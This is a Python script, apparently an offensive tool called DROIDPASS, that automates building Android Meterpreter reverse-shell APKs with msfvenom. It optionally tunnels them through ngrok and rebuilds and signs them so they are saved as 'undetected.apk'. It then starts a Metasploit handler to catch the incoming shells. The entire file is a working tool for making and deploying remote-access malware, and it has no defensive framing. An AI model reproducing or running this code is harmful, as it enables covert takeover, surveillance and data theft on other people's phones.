import os
import time
from requests import get
import requests


class bcolors:
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'


banner = """
 ____  ____   ___ ___ ____  ____   _    ____ ____  
|  _ \|  _ \ / _ \_ _|  _ \|  _ \ / \  / ___/ ___| 
| | | | |_) | | | | || | | | |_) / _ \ \___ \___ \ 
| |_| |  _ <| |_| | || |_| |  __/ ___ \ ___) |__) |
|____/|_| \_\\___/___|____/|_| /_/   \_\____/____/ 
this tool created by youhacker

"""
print(bcolors.OKGREEN, banner)

if os.system("which msfconsole >/dev/null 2>&1") == 0 and os.system("which apktool >/dev/null 2>&1") == 0:
    pass
else:
    print(bcolors.OKGREEN, "installing apktool and metasploit")
    time.sleep(2)
    os.system("apt-get install apktool && apt-get install metasploit-framework")
if os.path.exists("/root/.android") == True:
    pass
else:
    os.system("mkdir ~/.android")
if os.path.isfile("/root/.android/debug.keystore") == False:
    print(bcolors.WARNING, "android debug key not found. generating 1 now")
    os.system(
        "keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000")
    print(bcolors.OKGREEN, "key generated")
else:
    pass
print("""
1)use ngrok (auto port forwarding)
2)put host and port manually
""")
manauto = int(input("choose option:"))
if manauto == 1:
    if os.system("which ngrok >/dev/null 2>&1") != 0:
        os.system("pip3 install pyngrok")
        with open('/root/.ngrok2/ngrok.yml') as ngrok:
            if '{}' in ngrok.read():
                print(bcolors.WARNING, "ngrok authtoken not found")
                auth32 = input("entre authtoken:")
                os.system("ngrok authtoken " + auth32)
            else:
                pass
    try:
        url = "http://127.0.0.1:4040/api/tunnels"
        recived = requests.get(url)
        tcp = recived.json()["tunnels"][0]["public_url"]
        zz = (tcp[6:20])
        hostport = (tcp[21:])
    except requests.ConnectionError:
       print(bcolors.WARNING,"please start Ngrok tunnel open new terminal and tpye Ngrok tcp your port")
       exit()
    else:
        print(bcolors.OKBLUE, """
        available payloads
              1)android/meterpreter/reverse_tcp
              2)android/meterpreter/reverse_https
              3)android/meterpreter/reverse_http
              """)
        def automation():
            x = int(input("choose option:"))
            if x == 1:
                os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+zz+" lport="+hostport+" R> payload.apk")
            elif x == 2:
                os.system("msfvenom -p android/meterpreter/reverse_https lhost="+zz+" lport="+hostport+" R> payload.apk")
            elif x == 3:
                os.system("msfvenom -p android/meterpreter/reverse_http lhost="+zz+" lport="+hostport+" R> payload.apk")
            else:
                print("option not found")
                automation()
        automation()
        os.system("apktool d payload.apk")
        os.system("rm -rf payload.apk && cd payload && rm AndroidManifest.xml ")
        os.system("cp AndroidManifest.xml payload")
        os.system("apktool b payload")
        os.system("cd payload/dist/ && mv payload.apk ..")
        os.system("cd payload && mv payload.apk ..")
        os.system("rm -rf payload")
        os.system("java -jar uber-apk-signer.jar --apks payload.apk")
        os.system("rm payload.apk")
        os.system("mv payload-aligned-debugSigned.apk undetected.apk")
        print(bcolors.OKGREEN, "payload saved as undetected.apk")
        listen = input("do you want to start msf handler y/n:")
        if listen == "y":
            localport = input("entre lport:")
            connection = input("what type of protocol to listen on(tcp,http,https):")
            os.system("touch port_"+localport+".rc")
            file = open("port_"+localport+".rc","a")
            file.write("use multi/handler\n")
            file.write("set payload android/meterpreter/reverse_"+connection+"\n")
            file.write("set lhost 0.0.0.0\n")
            file.write("set lport "+localport+"\n")
            file.write("exploit")
            file.close()
            os.system("msfconsole -r port_"+localport+".rc")
            os.system("mv port_" + localport + ".rc handlerfiles")
            print(bcolors.OKCYAN, "Handler options saved in handlerfiles as port_"+localport+".rc")
            exit()
        else:
            exit()

ip = get('https://api.ipify.org').text
# get public ip addr
print(bcolors.WARNING, "your public ip addr is", ip)
ip = input("entre lhost:")
port = input("entre lport:")
print(bcolors.OKBLUE, """
available payloads
      1)android/meterpreter/reverse_tcp
      2)android/meterpreter/reverse_https
      3)android/meterpreter/reverse_http
      """)


def payload():
    x = int(input("choose option:"))
    if x == 1:
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" R> payload.apk")
    elif x == 2:
        os.system("msfvenom -p android/meterpreter/reverse_https lhost="+ip+" lport="+port+" R> payload.apk")
    elif x == 3:
        os.system("msfvenom -p android/meterpreter/reverse_http lhost="+ip+" lport="+port+" R> payload.apk")
    else:
        print("option not found")
        payload()


payload()
# Decompiling apk
os.system("apktool d payload.apk")
# removing old payload
os.system("rm -rf payload.apk && cd payload && rm AndroidManifest.xml ")
os.system("cp AndroidManifest.xml payload")
# Recompiling
os.system("apktool b payload")
os.system("cd payload/dist/ && mv payload.apk ..")
os.system("cd payload && mv payload.apk ..")
os.system("rm -rf payload")
# sign the apk
os.system("java -jar uber-apk-signer.jar --apks payload.apk")
os.system("rm payload.apk")
os.system("mv payload-aligned-debugSigned.apk undetected.apk")
print(bcolors.OKGREEN, "payload saved as undetected.apk")
rc = input("do you want to start handler y/n:")
if rc == "y":
    listener = input("what type of protocol to listen on(tcp,http,https):")
    os.system("touch port_"+port+".rc")
    file = open("port_"+port+".rc","a")
    file.write("use multi/handler\n")
    file.write("set payload android/meterpreter/reverse_"+listener+"\n")
    file.write("set lhost "+ip+"\n")
    file.write("set lport "+port+"\n")
    file.write("exploit\n")
    file.close()
    os.system("msfconsole -r port_"+port+".rc")
    os.system("mv port_"+port+".rc handlerfiles")
    print(bcolors.OKCYAN,"Handler options saved in handlerfiles as port_"+port+".rc")
    exit()
else:
    exit()
